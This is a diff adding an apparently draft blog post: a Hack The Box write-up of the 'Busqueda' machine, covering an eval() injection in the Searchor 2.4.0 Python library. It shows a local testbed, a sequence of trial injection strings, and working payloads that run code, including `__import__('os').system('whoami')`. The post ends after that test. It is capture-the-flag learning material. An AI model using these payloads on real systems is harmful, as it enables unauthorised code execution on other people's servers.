@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <meta name="generator" content="Pelican" />
+        <title>HTB Machine Busqueda</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+        <meta name="description" content="Busqueda is a 2023 machine (don't know exactly) and is in the easy range. Init Recon It has two ports (22, 80) open. On port 80 is a webapp. We..." />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">gbaru's blog</a></h1>
+                <nav><ul>
+                    <li><a href="/">Articles</a></li>
+                    <li><a href="/tags/">Tags</a></li>
+                    <li><a href="/category/general.html">General</a></li>
+                    <li><a href="/category/misc.html">Misc</a></li>
+                    <li><a href="/category/red.html">Red</a></li>
+                    <li><a href="/category/windows.html">Windows</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/drafts/htb-machine-busqueda.html" rel="bookmark"
+           title="Permalink to HTB Machine Busqueda">HTB Machine Busqueda</a></h1>
+    </header>
+
+    <div class="entry-content">
+<footer class="post-info">
+        <abbr class="published" title="2023-05-11T22:00:00+02:00">
+                Published: Thu 11 May 2023
+        </abbr>
+
+        <address class="vcard author">
+                By                         <a class="url fn" href="/author/gbaru.html">gbaru</a>
+        </address>
+<p>In <a href="/category/linux.html">Linux</a>.</p>
+<p>tags: <a href="/tag/ctf.html">ctf</a> <a href="/tag/linux.html">linux</a> <a href="/tag/python.html">python</a> <a href="/tag/eval.html">eval</a> </p>
+</footer><!-- /.post-info -->      <p>Busqueda is a 2023 machine (don't know exactly) and is in the easy range.</p>
+<h2>Init Recon</h2>
+<p><img alt="picture 1" src="../images/04ac0f19058874fcb4e8b581c67fc3cdf4752bbf679a5f8f55228d9d049105f4.png">  </p>
+<p>It has two ports (22, 80) open. On port 80 is a webapp. We start with that.
+Sorry for my version of the web-page might look ugly. I used HTB Pwnbox, and they can't load the js because of no internet.
+<img alt="picture 2" src="../images/37178a6082db92266f1de3a13693b0b159e8efbfe5c8665657e1dbb91ed91ca5.png">  </p>
+<p>By googling for Searchor <a href="https://github.com/ArjunSharda/Searchor/commit/29d5b1f28d29d6a282a5e860d456fab2df24a16b">this</a> eval problem will show up. I tried to exploit it blind by guessing but I was out of luck. So I will go into building a testbed.</p>
+<p>Therefore, we install searchor and just copy the code, but minimize what we probably don't need, so I removed the history part:</p>
+<div class="highlight"><pre><span></span><code>pip<span class="w"> </span>install<span class="w"> </span><span class="nv">searchor</span><span class="o">==</span><span class="m">2</span>.4.0,click
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">click</span>
+<span class="kn">from</span> <span class="nn">searchor</span> <span class="kn">import</span> <span class="n">Engine</span>
+
+<span class="k">def</span> <span class="nf">search</span><span class="p">(</span><span class="n">engine</span><span class="p">,</span> <span class="n">query</span><span class="p">,</span> <span class="nb">open</span><span class="p">,</span> <span class="n">copy</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">url</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span>
+            <span class="sa">f</span><span class="s2">&quot;Engine.</span><span class="si">{</span><span class="n">engine</span><span class="si">}</span><span class="s2">.search(&#39;</span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="s2">&#39;, copy_url=</span><span class="si">{</span><span class="n">copy</span><span class="si">}</span><span class="s2">, open_web=</span><span class="si">{</span><span class="nb">open</span><span class="si">}</span><span class="s2">)&quot;</span>
+        <span class="p">)</span>
+        <span class="n">url</span> <span class="o">=</span> <span class="n">Engine</span><span class="p">[</span><span class="n">engine</span><span class="p">]</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="n">copy_url</span><span class="o">=</span><span class="n">copy</span><span class="p">,</span> <span class="n">open_web</span><span class="o">=</span><span class="nb">open</span><span class="p">)</span>
+        <span class="n">click</span><span class="o">.</span><span class="n">echo</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">AttributeError</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;engine not recognized&quot;</span><span class="p">)</span>
+
+<span class="n">search</span><span class="p">(</span><span class="s2">&quot;Google&quot;</span><span class="p">,</span><span class="s2">&quot;INJECT-HERE&quot;</span><span class="p">,</span><span class="kc">False</span><span class="p">,</span><span class="kc">False</span><span class="p">)</span>
+</code></pre></div>
+
+<p>now we can just run with different injections</p>
+<div class="highlight"><pre><span></span><code><span class="s">&#39; -&gt; SyntaxError: unterminated triple-quoted string literal </span>
+<span class="s">&#39;</span><span class="p">)</span><span class="c1">#             -&gt; no error</span>
+<span class="s">&#39;);#            -&gt; invalid syntax &lt;-&gt; ; is not allowed</span>
+<span class="s">&#39;</span><span class="p">)</span><span class="nf">print</span><span class="p">(</span><span class="s">&quot;hi&quot;</span><span class="p">)</span><span class="c1">#  -&gt; the double-quote breaks the search function call</span>
+<span class="s">&#39;)print(&#39;</span><span class="n">hi</span><span class="s">&#39;)#  -&gt; invalid syntax &lt;-&gt; probably because two connected commands</span>
+<span class="s">&#39;</span><span class="p">),</span><span class="nf">print</span><span class="p">(</span><span class="s">&#39;hi&#39;</span><span class="p">)</span><span class="c1"># -&gt; works!!!</span>
+</code></pre></div>
+
+<p><img alt="picture 3" src="../images/951d2ae424d35221ae7d9fa0a8a8852496a42404d0440ff4e0d07b37842e1399.png">  </p>
+<p>Just to see how that can be, I verified that in python directly, seems function calls can be seperated with a colon:
+<img alt="picture 4" src="../images/7541f719e1803d0038a0fe81f93cdec7e4841b7bad72e8fc7b9f2245eb6be845.png">  </p>
+<p>So the two main things I recognize that did not work with random rev shells from the web are double quotes and semicolon. For most functionality we want to have we will need to be able to import in python. Since we will work with one line of code, normaly imports would be seperated with semicolon still.</p>
+<p>The reason is probably that there can not be confusion between a function call and importing, like so:</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">os.system</span><span class="p">(</span><span class="s2">&quot;hi&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>Therefore we need a way to get to this functionality.</p>
+<p>By looking at the rev shells <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python">here</a>, we can see that an import can be done like:</p>
+<div class="highlight"><pre><span></span><code><span class="n">os</span><span class="o">=</span><span class="nb">__import__</span><span class="p">(</span><span class="s2">&quot;os&quot;</span><span class="p">);</span><span class="o">...</span><span class="p">;</span><span class="n">os</span><span class="o">.</span><span class="n">dub2</span><span class="p">(</span><span class="o">...</span><span class="p">)</span>
+</code></pre></div>
+
+<p>Now think about it, this will put the import in the variable and later work on it. Meaning we can just shorten this code to:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">__import__</span><span class="p">(</span><span class="s2">&quot;os&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">dub2</span><span class="p">(</span><span class="o">...</span><span class="p">)</span>
+</code></pre></div>
+
+<p>Therefore a way of executing code should be possible with</p>
+<div class="highlight"><pre><span></span><code><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>Testing shows it works:</p>
+<p><img alt="picture 6" src="../../images/a7b4ddb8a7dbf053aaf97fbc062a997bd95a596f63db2fbf92e2c4b9304c69fd.png">  </p>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+                <div class="social">
+                        <h2>social</h2>
+                        <ul>
+
+                            <li><a href="mailto:blog.gbarut@riskreduction.net">mail-128</a></li>
+                            <li><a href="http://twitter.com/GanbaruTobi">twitter</a></li>
+                            <li><a href="http://github.com/GanbaruTobi">github</a></li>
+                        </ul>
+                </div><!-- /.social -->
+        </section><!-- /#extras -->
+
+        <footer id="contentinfo" class="body">
+                <address id="about" class="vcard body">
+                Proudly powered by <a href="https://getpelican.com/">Pelican</a>, which takes great advantage of <a href="https://www.python.org/">Python</a>.
+                </address><!-- /#about -->
+
+                <p>The theme is by <a href="https://www.smashingmagazine.com/2009/08/designing-a-html-5-layout-from-scratch/">Smashing Magazine</a>, thanks!</p>
+        </footer><!-- /#contentinfo -->
+
+</body>
+</html>
